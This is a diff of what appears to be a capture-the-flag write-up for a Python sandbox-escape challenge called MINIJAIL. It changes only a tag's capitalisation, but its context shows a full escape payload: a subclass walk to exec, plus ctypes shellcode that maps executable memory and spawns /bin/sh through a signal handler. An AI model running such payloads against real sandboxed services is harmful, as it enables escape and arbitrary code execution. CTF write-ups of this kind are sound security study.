@@ -7,7 +7,7 @@ lastmod: "2025-08-30T00:47:47+08:00"
 image: ""
 license: ""
 categories: ["赛题"]
-tags: ["jail"]
+tags: ["Jail"]
 
 ---
 ## MINIJAIL（27solves）
@@ -440,4 +440,3 @@ TID      Uid(R/E/S)   Gid(R/E/S)   State    Comm
 ```bash
 ().__class__.__base__.__subclasses__()[166].__init__.__globals__['__builtins__']['exec']("ctypes=__import__('ctypes');m=__import__('o'+'s');libc=ctypes.CDLL(None);PROT_READ,PROT_WRITE,PROT_EXEC=1,2,4;MAP_PRIVATE,MAP_ANONYMOUS=2,32;SIGUSR1=10;SYS_TGKILL=234;size=0x1000;mm=libc.mmap;mm.restype=ctypes.c_void_p;addr=mm(0,size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);sc=b'\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05';ctypes.memmove(addr,sc,len(sc));CB=ctypes.CFUNCTYPE(None,ctypes.c_int);handler=ctypes.cast(addr,CB);libc.signal.argtypes=(ctypes.c_int,CB);libc.signal.restype=CB;libc.signal(SIGUSR1,handler);pid=m.getpid();libc.syscall(SYS_TGKILL,pid,pid,SIGUSR1)",().__class__.__base__.__subclasses__()[166].__init__.__globals__['__builtins__'])
 ```
-
